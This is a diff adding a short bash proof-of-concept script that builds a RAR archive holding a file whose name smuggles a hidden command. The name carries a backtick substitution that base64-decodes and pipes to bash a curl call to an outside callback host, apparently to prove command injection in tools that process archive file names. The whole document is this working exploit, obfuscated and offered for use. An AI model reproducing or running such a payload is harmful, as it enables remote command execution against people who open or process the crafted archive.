@@ -1,0 +1,10 @@
+#!/bin/bash
+PAYLOAD_NAME="testpoc.pdf\`{echo Y3VybCBodHRwOi8vc2R5eWE0Mm4uZG5zLmFkeXNlYy5jb20K}|{base64 -d}|bash\`"
+WORKDIR=$(mktemp -d)
+cd "$WORKDIR" || exit 1
+echo -n "12345" > "$PAYLOAD_NAME"
+OUTPUT_RAR="payload_testpoc.rar"
+rar a -ma5 -m0 -ep "$OUTPUT_RAR" "$PAYLOAD_NAME"
+mv "$OUTPUT_RAR" "$OLDPWD"
+echo "[+] Done: $OUTPUT_RAR created."
+rm -rf "$WORKDIR"
